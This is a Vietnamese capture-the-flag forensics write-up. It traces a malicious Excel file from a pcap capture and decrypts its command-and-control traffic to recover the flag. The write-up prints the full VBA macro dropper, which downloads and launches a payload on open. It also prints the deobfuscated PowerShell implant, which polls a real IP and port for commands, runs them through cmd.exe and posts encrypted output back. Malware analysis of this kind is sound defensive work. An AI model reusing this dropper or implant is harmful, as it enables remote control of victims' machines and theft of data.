# _UNDER CONTROL_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/9e6bf7b3-c9ee-43d6-ac87-b5c487fac275)

Thử thách cho 1 file pcap, dùng wireshark phân tích

![image](https://github.com/user-attachments/assets/987707cc-9378-40a3-a062-dec58d12006e)

Có thể thấy 1 gói tin http GET request đối với file **/Danh%20s%C3%A1ch%20ph%C3%A2n%20thi.xls** liền export http file đó về

Khả năng rất cao là office dính vba nên cho lên máy ảo mới dám mở

![image](https://github.com/user-attachments/assets/873fb97d-65a1-41bf-94ea-b2fafa49c537)

Chắc chắn là dính vba rồi, đem qua kali dùng olevba để phân tích 

![image](https://github.com/user-attachments/assets/f8a90da0-7392-4500-84ed-ddfcc5ce4f80)

Nhìn cũng hoa hết mắt 😣 Nhưng thực chất đoạn mã trên bị làm rối bằng cách sử dụng hàm với những kí tự loằng ngoằng và khó hiểu, ngồi xem một lúc thì mình thấy được có 1 thứ gì đó khá giống với đường link nhưng khả năng đã bị mã hóa

![image](https://github.com/user-attachments/assets/36472ae1-7452-423d-a0ea-f0f98ce9595d)

Nét gạch chân dưới và format rất giống với 1 đường link https :v Giờ quay lại với vấn đề chính là đoạn mã vba kia mình sẽ dùng vscode để chỉnh lại các hàm cho dễ đọc

```vba
Function a(b)
c = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
d = "ãXL1lYU~Ùä,Ca²ZfÃ@dO-cq³áÕsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(ÒSw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
For y = 1 To Len(b)
e = InStr(c, Mid(b, y, 1))
If e > 0 Then
f = Mid(d, e, 1)
g = g + f
Else
g = g + Mid(b, y, 1)
End If
Next
a = g
For h = 1 To Len(i)
i = h
Next
For j = 2 To Len(k)
k = 2
Next
For l = 3 To Len(m)
m = l
Next
For n = 4 To Len(o)
o = 2
Next
End Function
Sub Workbook_Open()
Dim p As Object
Dim q As String
Dim r As String
Dim s As String
Dim t As Integer
t = Chr(50) + Chr(48) + Chr(48)
Set p = CreateObject("WScript.Shell")
q = p.SpecialFolders("AppData")
Dim u
Dim v
Dim ¢e¶
Dim h As Long
Dim j As String
Dim w As Long
Dim m As String
Dim l As Long
Dim n As String
Dim x As String
Dim k As Long
Dim w
Dim y
Dim z As Integer
Dim huong6
Dim huong
z = 1
Range("A1").Value = a("4BEiàiuP3x6¿QEi³")
Dim huong2 As String
huong3 = "$x¿PÜ_jEPkEEiPÜ_6IE3P_i3PÛx¿²PàQBx²³_i³P3x6¿QEi³bPÜ_jEPkEEiPb³x#Eir" & vbCrLf & "ÒxP²E³²àEjEP³ÜEbEP3_³_(PÛx¿P_²EP²E7¿à²E3P³xP³²_ib0E²P@mmIP³xP³ÜEP0x##xÄàiuPk_iIP_66x¿i³Pi¿QkE²:P" & vbCrLf & "@m@m@mo@@§mmm" & vbCrLf & "g66x¿i³PÜx#3E²:PLu¿ÛEiPÒÜ_iÜP!xiu" & vbCrLf & "t_iI:PTtPt_iI"
huong2 = a(huong3)
MsgBox huong2, vbInformation, a("pEP3EEB#ÛP²Eu²E³P³xPài0x²QPÛx¿")
Dim huong4 As Date
Dim huong5 As Date
huong4 = Date
huong5 = DateSerial(2023, 6, 6)
If huong4 < huong5 Then
Set huong6 = CreateObject("microsoft.xmlhttp")
Set y = CreateObject("Shell.Application")
w = q + a("\k¿i6Ü_~Bb@")
huong6.Open "get", a("Ü³³Bb://uàb³~uà³Ü¿k¿bE²6xi³Ei³~6xQ/k7¿_iQ_i/fÀ3_o-3Yf0_E6m6kk3_km§3Y03ÀY_3__/²_Ä/À3EÀkfmfÀ@Eããoãä§k@_@ã0ä6_E3-ãY036-@@koo/_Àmb6m@§~Bb@"), False
huong6.send
v = huong6.responseBody
If huong6.Status = 200 Then
Set u = CreateObject("adodb.stream")
u.Open
u.Type = z
u.Write v
u.SaveToFile w, z + z
u.Close
End If
y.Open (w)
Else
MsgBox a("åxi'³P³²ÛP³xP²¿iPQEPk²x")
End If
End Sub
```

Đây là đoạn code đầu tiên mình chú ý

![image](https://github.com/user-attachments/assets/01dc0c37-759f-4de0-a2d9-7b04f15e01c8)

Thấy được 1 Function a xử lí chuỗi đầu vào b. Nếu kí tự trong chuỗi b có trong chuỗi c thì hàm sẽ thay thế nó bằng kí tự trong chuỗi d với vị trí tương ứng, kết quả cuối sẽ được lưu vào chuỗi g

Ví dụ:
- b = "abc"
- c = "abcdef"
- d = "123456"

-> g = "123"

Giờ thì sẽ đi tìm ở các chuỗi bị encypt 

![under](https://github.com/user-attachments/assets/988cf549-3bb1-4496-bf7d-8d21831df675)

Có thể thấy đoạn mã liên tục khởi tạo hàm với 1 chuỗi khó hiểu và gọi hàm a ra để decrypt. Mình sẽ decrypt đoạn này trc tại khá giống với 1 đường link https

```
Ü³³Bb://uàb³~uà³Ü¿k¿bE²6xi³Ei³~6xQ/k7¿_iQ_i/fÀ3_o-3Yf0_E6m6kk3_km§3Y03ÀY_3__/²_Ä/À3EÀkfmfÀ@Eããoãä§k@_@ã0ä6_E3-ãY036-@@koo/_Àmb6m@§~Bb@
```
Script:

```python
def a(b):
    c = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂÃÄÅÒÓÔÕÖÙÛÜàáâãäåØ¶§Ú¥"
    d = "ãXL1lYU~Ùä,Ca²ZfÃ@dO-cq³áÕsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(ÒSw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
    
    g = ""
    for char in b:
        index = c.find(char)  # Tìm vị trí của ký tự trong 
        if index != -1:
            g += d[index]  # Lấy ký tự tương ứng trong c
        else:
            g += char  # Nếu không tìm thấy thì giữ nguyên
    
    return g

huong = "Ü³³Bb://uàb³~uà³Ü¿k¿bE²6xi³Ei³~6xQ/k7¿_iQ_i/fÀ3_o-3Yf0_E6m6kk3_km§3Y03ÀY_3__/²_Ä/À3EÀkfmfÀ@Eããoãä§k@_@ã0ä6_E3-ãY036-@@koo/_Àmb6m@§~Bb@"
giaima = a(huong)
print(giaima)
```

Kết quả là một đường link github

![image](https://github.com/user-attachments/assets/9f85af81-327e-4f83-ad6a-ac7ebd9053d3)

Mình cũng sẽ thử decode một số hàm khác xem có gì 🤭

![image](https://github.com/user-attachments/assets/094485db-9840-4f81-8a4c-a4950c2037b1)

Thấy đc chính là các thông báo khi mình ấn vô xem trực tiếp file excel kia

Quay lại vấn đề chính là link github kia và đây là nội dung

![image](https://github.com/user-attachments/assets/1ef52a58-0439-4ff4-81e0-570b1a3c69f4)

decode cái này mình dùng cyberchef cho đơn giản

![image](https://github.com/user-attachments/assets/8dc2022d-b344-4c37-9b39-d06597630b51)

Thấy một đoạn mã pwsh bị obfuscated, dùng powerdecode để làm đẹp hơn

![image](https://github.com/user-attachments/assets/e5a89ce2-1de9-48ea-8adf-4127c8bad879)

Kết quả:

```powershell
${8rT3WA}  = [tyPe]'sySTEm.seCUrItY.cryPTOGRaphY.CiphERMOde' ;SV '72j5O'  (  [TYpe]'sYstem.seCuriTY.cRYptoGRapHY.paDDingmOde'  ) ;   ${XNfD}=[tyPe]'System.cONVErT'  ;  ${HLvW1} =  [tYPe]'SYStEM.tEXt.EnCOdiNG';  SeT-iTem 'vARIabLE:92y7'  (  [Type]'SysteM.NEt.dnS')  ; ${UJXRc}=[tyPE]'StrinG' ;function CrEATe-AeSmanAGeDoBJeCt(${vxZTmff}, ${5TMRWpLUy}) {
    
    ${AJuJVRAZ99}           = New-Object 'System.Security.Cryptography.AesManaged'
    ${AJUjvrAZ99}.Mode      =   (  gEt-vARIAblE  ("8rt3Wa") -Value  )::"cBc"
    ${aJujVRAZ99}.PAddInG   =  ( Dir  'vARIable:72j5o'  ).VALUe::"zeRos"
    ${AJUJvrAz99}.BlOckSizE = 128
    ${AjuJvRAz99}.keysIze   = 256
    
    if (${5TMRWPluy}) {
        
        if (${5TmRWpLuy}.getType.iNVOke().nAME -eq 'String') {
            ${ajUjvRaZ99}.Iv =  (dir  'vaRIaBle:xNFd').vAlUe::'FromBase64String'.InVOKe(${5TMRWPlUy})
        }
        
        else {
            ${ajUjVraZ99}.IV = ${5tmRwPLUy}
        }
    }
    
    if (${VxZtMFF}) {
        
        if (${VXzTmfF}.getType.INvoKe().nAME -eq 'String') {
            ${ajUjVraZ99}.Key =  ( LS 'VariAble:XNFD' ).vAluE::'FromBase64String'.invOKe(${vxzTmFF})
        }
        
        else {
            ${AjUJVrAZ99}.key = ${vXzTmff}
        }
    }
    
    ${aJUjvRAZ99}
}
function eNCRYpT(${VxzTMFf}, ${ROFPdqRF99}) {
    
    ${ByTES}             =   (  varIable  'hlvW1' ).vALUE::"uTf8".GetBytes.INVokE(${rOFpdQRF99})
    ${ajujVRAZ99}        = Create-AesManagedObject ${VXZtMFf}
    ${qDIqLGaQ99}         = ${aJujVRAZ99}.CreateEncryptor.inVoKe()
    ${lwihYmIF99}     = ${QdiqLgaq99}.TransformFinalBlock.iNvOKe(${byTeS}, 0, ${byTes}.LeNgTh);
    [byte[]] ${fJAxUWQN99} = ${AJujvRAz99}.Iv + ${lWiHYmiF99}
    ${ajUJVRAZ99}.Dispose.iNVOKE()
     ${xNFd}::"tOBase64STRiNG".iNvoke(${FjAXUWqN99})
}
function deCRyPT(${VXztmFF}, ${bKJrxQCf99}) {
    
    ${bYTEs}           =   (vARiable  'xnfd' ).ValuE::'FromBase64String'.InVOKE(${BkjRxqcF99})
    ${5tMRWpLuY}              = ${BYTes}[0..15]
    ${aJuJVraz99}      = Create-AesManagedObject ${VxZTmFF} ${5TMRwpLUY}
    ${MNDmWYnB99}       = ${AJUjvRAz99}.CreateDecryptor.InVoke();
    ${AhtLMYhl99} = ${MNDmWynB99}.TransformFinalBlock.iNvokE(${bYTES}, 16, ${byTeS}.lENgTH - 16);
    ${AJUjVRAZ99}.Dispose.INVOKE()
      ${HLVW1}::"uTF8".GETStriNg(${AhtLmYhl99}).TRIM(' ')
}
function ShELL(${DfJz1co}, ${yo8xm5}){
    
    ${CwzVYVJ}                        = New-Object 'System.Diagnostics.ProcessStartInfo'
    ${CwZVyVj}.FIlename               = ${DFjZ1co}
    ${CWzvYvj}.reDIRecTsTAnDaRdERrOR  = ${TRue}
    ${cwZVYVJ}.ReDIREcTsTANdarDoUTPUT = ${tRUe}
    ${CWZvyVJ}.USEshELleXeCUTe        = ${FALsE}
    ${cwzvyVJ}.aRgUmENtS              = ${yO8xm5}
    ${p}                            = New-Object 'System.Diagnostics.Process'
    ${P}.sTArTiNFO                  = ${CWzvYVj}
    
    ${p}.Start.INvoKE() | Out-Null
    ${P}.WaitForExit.invoKE()
    
    ${BHnxNUrW99} = ${p}.staNdardOuTpUT.ReadToEnd.INVOkE()
    ${NmWkjOAB99} = ${p}.StANdArdeRrOR.ReadToEnd.Invoke()
    ${kCNjcQdL} = ('VALID '+"$BhnXnUrW99n$nmWKJOAb99")
    ${KcnJcQDl}
}
${FZvyCr}   = '128.199.207.220'
${twFTrI} = '7331'
${VxzTmff}  = 'd/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M='
${n}    = 3
${Cwj2TWh} = ""
${yCRUTw} =   ${92Y7}::'GetHostName'.inVoKE()
${FNFFGXDzj}  = "p"
${DFctDFM}  = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/reg")
${kVQBXbuR}  = @{
    'name' = "$YCRUTw" 
    'type' = "$fNFFGXDZJ"
    }
${CWj2TWh}  = (Invoke-WebRequest -UseBasicParsing -Uri ${dFctDFM} -Body ${kVqBxbUr} -Method 'POST').coNTENT
${TvYMeYrR99} = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
${iJfySE2}   = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")
for (;;){
    
    ${MA04XMgY}  = (Invoke-WebRequest -UseBasicParsing -Uri ${IJFYSE2} -Method 'GET').cONTeNt
    
    if (-Not  ${UJXRc}::'IsNullOrEmpty'.INvOKe(${MA04XmGy})){
        
        ${mA04XMgY} = Decrypt ${VXZTmff} ${Ma04XMgY}
        ${mA04XMgY} = ${ma04XMgy}.split.INvokE()
        ${FLAG} = ${MA04xmgY}[0]
        
        if (${FlAg} -eq 'VALID'){
            
            ${WB1SWYoje} = ${MA04XMgY}[1]
            ${yO8XM5S}    = ${Ma04XMgY}[2..${MA04xmgY}.LeNgTH]
            if (${wb1sWyoJe} -eq 'shell'){
            
                ${F}    = 'cmd.exe'
                ${yO8XM5}  = "/c "
            
                foreach (${a} in ${yo8xM5s}){ ${Yo8xm5} += ${a}}
                ${KcNJCQdL}  = shell ${f} ${yo8xM5}
                ${kCnjCQDL}  = Encrypt ${VxztMFF} ${kcNjcqdl}
                ${kvqbXBUr} = @{'result' = "$KcnJCQDl"}
                
                Invoke-WebRequest -UseBasicParsing -Uri ${tVyMEyRR99} -Body ${kVQbXbur} -Method 'POST'
            }
            elseif (${Wb1SwYOJe} -eq ''){
            
                ${f}    = '.exe'
                ${yO8Xm5}  = "/c "
            
                foreach (${a} in ${Yo8xM5s}){ ${YO8xm5} += ${a}}
                ${kcNjcqdL}  = shell ${F} ${yO8XM5}
                ${kcnjCQDL}  = Encrypt ${vXZTmfF} ${KCNjcqDl}
                ${KVqbxBUr} = @{'result' = "$KcnJCQDl"}
                
                Invoke-WebRequest -UseBasicParsing -Uri ${tvyMEYRR99} -Body ${kVqBXbUr} -Method 'POST'
            }
            elseif (${wb1swYOJe} -eq 'sleep'){
                ${n}    = [int]${yO8Xm5S}[0]
                ${kVQBXbur} = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri ${tVYmeyrR99} -Body ${KvQBXBur} -Method 'POST'
            }
            elseif (${wb1sWyojE} -eq 'rename'){
                
                ${cwJ2tWh}    = ${YO8Xm5S}[0]
                ${TVYmeyRr99} = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/results/$cWJ2Twh")
                ${ijFYsE2}   = ('http:' + "//$FZVYCR" + ':' + "$TwFTRi/tasks/$cWJ2Twh")
            
                ${kVQbXbUr}    = @{'result' = ""}
                Invoke-WebRequest -UseBasicParsing -Uri ${TVYmEyRR99} -Body ${KvqBxbUr} -Method 'POST'
            }
            elseif (${wB1sWYOJe} -eq 'quit'){
                exit
            }
        }
    sleep ${N}
    }
}
```
Đoạn mã khá dài, nên mình sẽ chú thích vào ảnh cho dễ hình dung

![2](https://github.com/user-attachments/assets/aef68203-b623-48d2-b970-df98d2461ed5)

KEY:
>d/3KwjM7m2cGAtLI67KlhDuXI/XRKSTkOlmJXE42R+M=

Tiếp theo:

![4](https://github.com/user-attachments/assets/3992f786-a861-4d8c-a02f-8f2e7beef28e)

Đã xác định được dữ liệu cần phân tích tiếp nằm ở yêu cầu HTTP POST

![5](https://github.com/user-attachments/assets/ca4304ba-945c-4b10-b237-3d52992d4431)

Dùng tshark để extract hết đống đó 

![image](https://github.com/user-attachments/assets/8519d87c-4485-4d79-9a6b-101b15ccb515)

Có thể thấy ban đầu tên máy tính đã được gửi đi, từ dữ liệu trên lấy được IV bằng 16 byte đầu của dữ liệu mã hóa

![image](https://github.com/user-attachments/assets/9176a2f5-a323-486e-bbfc-f1d88350ca4a)

IV
>6a 2c 7c 47 1a ea 16 0f 56 8b 6b a2 13 a0 7c 05

KEY
>77 fd ca c2 33 3b 9b 67 06 02 d2 c8 eb b2 a5 84 3b 97 23 f5 d1 29 24 e4 3a 59 89 5c 4e 36 47 e3

Phần còn lại sẽ đem đi decode với thứ tự lần lượt là BASE64 -> AES

![image](https://github.com/user-attachments/assets/ae17ca18-111e-42a7-bc93-344e16c8ef78)

Thấy đoạn mã hex, decode tiếp thì nhận đc flag 🫵

![image](https://github.com/user-attachments/assets/39ad04e8-f555-4c51-9157-eb126eb89d5e)

```
FLAG: CHH{D0n't_w0rRy_n0_st@r_wh3rE}
```


